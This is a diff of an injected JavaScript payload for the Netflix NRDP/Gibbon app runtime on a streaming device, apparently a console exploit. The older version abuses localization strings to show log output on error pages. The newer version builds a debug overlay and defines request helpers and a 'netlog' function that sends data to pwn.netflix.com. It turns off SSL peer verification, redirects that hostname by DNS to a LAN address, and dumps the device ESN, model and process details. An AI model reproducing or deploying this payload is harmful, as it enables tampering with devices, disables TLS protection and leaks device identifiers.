@@ -1,212 +1,58 @@
 (function(){
-    var e="English",t="Back",n="Check your network",r="Sign out",i="Exit Netflix";
+    var overlay = null;
+    var lines = [];
+    var maxLines = 30;
 
-    // Store log messages
-    var logMessages = [];
+    var refreshTimer = null;
 
-    // Simple log function - automatically appends <br/>
-    this.log = function(msg) {
-        logMessages.push(msg);
-        var combined = logMessages.join("<br/>");
+    var log = function(msg) {
+        lines.push(msg);
+        if (lines.length > maxLines) lines.shift();
 
-        // Keep only last 500 chars to prevent overflow
-        if (combined.length > 500) {
-            while (combined.length > 500 && logMessages.length > 1) {
-                logMessages.shift();
-                combined = logMessages.join("<br/>");
+        // debounce refresh
+        if (refreshTimer) nrdp.clearTimeout(refreshTimer);
+        refreshTimer = nrdp.setTimeout(function() {
+            refresh();
+            refreshTimer = null;
+        }, 50);
+    };
+
+    function refresh() {
+        if (!overlay) return;
+
+        // clear only text widgets (preserve image)
+        if (overlay.children) {
+            for (var j = overlay.children.length - 1; j >= 0; j--) {
+                var child = overlay.children[j];
+                if (child && child._name && child._name.startsWith("ln")) {
+                    overlay.removeChild(child);
+                }
             }
         }
 
-        var logMsg = "<small>" + combined + "</small>";
+        // redraw
+        for (var i = 0; i < lines.length; i++) {
+            var w = nrdp.gibbon.makeWidget({
+                name: "ln" + i,
+                x: 10,
+                y: 10 + (i * 22),
+                width: 870,
+                height: 20
+            });
+            w.text = {
+                contents: lines[i],
+                size: 16,
+                color: {a: 255, r: 0, g: 255, b: 0},
+                wrap: true
+            };
+            w.parent = overlay;
+        }
+    }
 
-        var s = {
-            language: {
-                name: "en",
-                englishName: e,
-                nativeName: e,
-                isRtl: !1,
-                language: "en",
-                numberFormat: {
-                    pattern: {0:"-n",length:1},
-                    decimals: 2,
-                    ",": ",",
-                    ".": ".",
-                    groupSizes: {0:3,length:1},
-                    "+": "+",
-                    "-": "-",
-                    percent: {
-                        pattern: {0:"-n %",1:"n %",length:2},
-                        decimals: 2,
-                        groupSizes: {0:3,length:1},
-                        ",": ",",
-                        ".": ".",
-                        symbol: "%"
-                    },
-                    currency: {
-                        pattern: {0:"($n)",1:"$n",length:2},
-                        decimals: 2,
-                        groupSizes: {0:3,length:1},
-                        ",": ",",
-                        ".": ".",
-                        symbol: "$"
-                    }
-                },
-                calendar: {
-                    name: "Gregorian_USEnglish",
-                    "/": "/",
-                    "&#58;": ":",
-                    firstDay: 0,
-                    days: {
-                        names: {0:"Sunday",1:"Monday",2:"Tuesday",3:"Wednesday",4:"Thursday",5:"Friday",6:"Saturday",length:7},
-                        namesAbbr: {0:"Sun",1:"Mon",2:"Tue",3:"Wed",4:"Thu",5:"Fri",6:"Sat",length:7},
-                        namesShort: {0:"Su",1:"Mo",2:"Tu",3:"We",4:"Th",5:"Fr",6:"Sa",length:7}
-                    },
-                    months: {
-                        names: {0:"January",1:"February",2:"March",3:"April",4:"May",5:"June",6:"July",7:"August",8:"September",9:"October",10:"November",11:"December",12:"",length:13},
-                        namesAbbr: {0:"Jan",1:"Feb",2:"Mar",3:"Apr",4:"May",5:"Jun",6:"Jul",7:"Aug",8:"Sep",9:"Oct",10:"Nov",11:"Dec",12:"",length:13}
-                    },
-                    AM: {0:"AM",1:"am",2:"AM",length:3},
-                    PM: {0:"PM",1:"pm",2:"PM",length:3},
-                    eras: {0:{name:"A.D.",start:"",offset:0},length:1},
-                    twoDigitYearMax: 2029,
-                    patterns: {
-                        d: "M/d/yyyy",
-                        D: "dddd, MMMM dd, yyyy",
-                        t: "h:mm tt",
-                        T: "h:mm:ss tt",
-                        f: "dddd, MMMM dd, yyyy h:mm tt",
-                        F: "dddd, MMMM dd, yyyy h:mm:ss tt",
-                        M: "MMMM dd",
-                        Y: "yyyy MMMM",
-                        S: "yyyy'-'MM'-'dd'T'HH':'mm':'ss"
-                    }
-                },
-                fontGroup: "WGL"
-            },
-            strings: {
-                customerService: {
-                    signoutConfirmation: "Are you sure that you want to reset Netflix on this device?",
-                    signoutSuccess: "You have successfully reset this device.",
-                    legend: {back:t},
-                    device: {
-                        fields: {
-                            esn: "ESN",
-                            softwareVersion: "Software version",
-                            certVersion: "Certification version",
-                            netflixVersion: "Netflix version",
-                            deviceModel: "Device model",
-                            sdkVersion: "SDK version",
-                            platformVersion: "Platform version"
-                        },
-                        netflixVersionTmpl: "nrdapp ${nrdapp} / nrdlib ${nrdlib} / mdxlib ${mdxlib}",
-                        sdkVersionTmpl: "sdk ${sdk}"
-                    },
-                    contact: {
-                        title: "To contact Customer Service:",
-                        description: {webHelp:"Visit help.netflix.com."}
-                    },
-                    member: {
-                        fields: {name:"Name",email:"Email"},
-                        nameTmpl: "${firstName} ${lastName}"
-                    },
-                    network: {
-                        fields: {dnsServers:"DNS servers",wired:"Wired",wireless:"Wireless"},
-                        "default": "Default: Yes",
-                        ipAddressTmpl: "IP Address: ${address}",
-                        connectedWifiTmpl: "Connected: ${connected} - ${ssid}",
-                        connectedTmpl: "Connected: ${connected}",
-                        connected: {"true":"Yes","false":"No"},
-                        name: "Name: ${name}"
-                    },
-                    diagnostics: {
-                        results: {
-                            noInternet: "Your device may not be connected to the Internet. Please make sure your connection is working.",
-                            noNetflix: "Couldn't connect to Netflix. Please try again or restart your home network and streaming device. For more information, visit netflix.com/nethelp.",
-                            noProblem: "Network check successful."
-                        }
-                    },
-                    menu: {
-                        close: t,
-                        contact: "Customer service",
-                        member: "Member",
-                        network: "Network",
-                        device: "Device",
-                        diagnose: n,
-                        signout: r,
-                        exitnetflix: i,
-                        back: "Go back",
-                        reset: "Reset"
-                    },
-                    title: "Information"
-                },
-                errorPage: {
-                    runningDiagnostics: logMsg,
-                    runningDiagnosticsPs3: logMsg,
-                    retryingNow: logMsg,
-                    retryingBiep_pluralNoconnection: logMsg,
-                    retryingBiepSingularNoconnection: logMsg,
-                    retryingBiep_plural: logMsg,
-                    retryingBiepSingular: logMsg,
-                    retryingBiepCode: logMsg
-                },
-                networkDiagnostics: {
-                    error: {
-                        noNetflix: logMsg,
-                        noInternet: logMsg,
-                        noNetflixPs3: logMsg,
-                        noInternetPs3: logMsg
-                    }
-                },
-                checkYourNetwork: {
-                    netflixServer: "Netflix server ${number}",
-                    internetConnection: "Internet connection",
-                    runningCheck: "Running check...",
-                    checkYourNetwork: n,
-                    introDescription: "Test your Internet connection for any problems that might prevent you from using Netflix.",
-                    diagnosisFailure: "Unable to check your network. Please try again or visit www.netflix.com/nethelp."
-                },
-                signOut: {
-                    signOut: r,
-                    introDescription: "Sign out of your Netflix account on this device."
-                },
-                exitNetflix: {
-                    header: i,
-                    description: "Close the Netflix application."
-                },
-                responses: {
-                    confirm: "OK",
-                    exit: "Exit",
-                    no: "No",
-                    reactivate: "Sign Out",
-                    retry: "Try Again",
-                    yes: "Yes",
-                    customerService: "More Details"
-                },
-                reactivate: {
-                    getNewCredentialsError: "It looks like Netflix has been deactivated on this device. It could be an issue with your account, or perhaps your device was deactivated on Netflix.com."
-                },
-                exitDialog: "Do you want to exit Netflix?",
-                exitingMessage: "Exiting...",
-                reset: {
-                    title: "Reset Netflix",
-                    description: "Reset Netflix on this device back to its original state."
-                },
-                legend: {
-                    labels: {kids:"Kids",menu:"Menu",back:t}
-                }
-            }
-        };
-
-        util.localization.addCulture(s.language.name, s);
-    };
-
-
-
-    // Show value of a property
-    this.showValue = function(path) {
+    var show = function(path) {
         try {
-            var parts = path.split(".");
             var obj = window;
+            var parts = path.split(".");
             for (var i = 0; i < parts.length; i++) {
                 obj = obj[parts[i]];
                 if (obj === undefined) {
@@ -214,19 +60,101 @@
                     return;
                 }
             }
-            log(path + " = " + JSON.stringify(obj).substring(0, 200));
+            var val = (typeof obj === "object") ? JSON.stringify(obj) : String(obj);
+            log(path + " = " + val.substring(0, 200));
         } catch(ex) {
-            log(path + " Error: " + ex);
+            log(path + " ERR: " + ex);
         }
     };
 
-    // Auto-show device info
-    logMessages = [];
+    var get = function(url, cb) {
+        try {
+            nrdp.gibbon.load({
+                url: url,
+                requestMethod: "GET",
+                secure: false
+            }, function(r) {
+                if (cb) cb(r);
+            });
+        } catch(ex) {
+            log("GET failed: " + ex);
+        }
+    };
+
+    var post = function(url, data, cb) {
+        try {
+            nrdp.gibbon.load({
+                url: url,
+                requestMethod: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: data
+            }, function(r) {
+                if (cb) cb(r);
+            });
+        } catch(ex) {
+            log("POST failed: " + ex);
+        }
+    };
+
+    var netlog = function(msg) {
+        try {
+            get("https://pwn.netflix.com/?log=" + encodeURIComponent(msg));
+        } catch(ex) {
+            log("netlog ERR: " + ex);
+        }
+    };
+
+    this.log = log;
+    this.show = show;
+    this.get = get;
+    this.post = post;
+    this.netlog = netlog;
+
+    // init
+    overlay = nrdp.gibbon.makeWidget({
+        name: "dbg",
+        width: 1280,
+        height: 720,
+        backgroundColor: "#000000"
+    });
+    nrdp.gibbon.scene.overlay = overlay;
+
+    // load and display image
+    var imgWidget = nrdp.gibbon.makeWidget({
+        name: "img",
+        x: 480,
+        y: 10,
+        width: 550,
+        height: 700
+    });
+
+    imgWidget.image.url = "https://pwn.netflix.com/test.png";
+    imgWidget.parent = overlay;
+    
+    
+    //-----------------END LOGGING SETUP-------------------\\
+
+    // disable SSL verification
+    nrdp.gibbon._runConsole("/command ssl-peer-verification false");
+
+    // set DNS record for pwn.netflix.com
+    nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
+        addresses: ["192.168.0.111"],
+        ttl: 3600000
+    });
+
+    // show device info
     log("=== DEVICE INFO ===");
-    showValue("nrdp.device.ESN");
-    showValue("nrdp.device.deviceModel");
-    showValue("nrdp.device.softwareVersion");
-    showValue("nrdp.pid");
-    showValue("nrdp.cwd");
+    show("nrdp.device.ESN");
+    show("nrdp.device.deviceModel");
+    show("nrdp.device.softwareVersion");
+    show("nrdp.device.friendlyName");
+    show("nrdp.device.language");
+    show("nrdp.pid");
+    show("nrdp.cwd");
+
+    log("=== VERSION INFO ===");
+    show("nrdp.device.version.gibbon");
+    show("nrdp.device.SDKVersion");
 
 })();
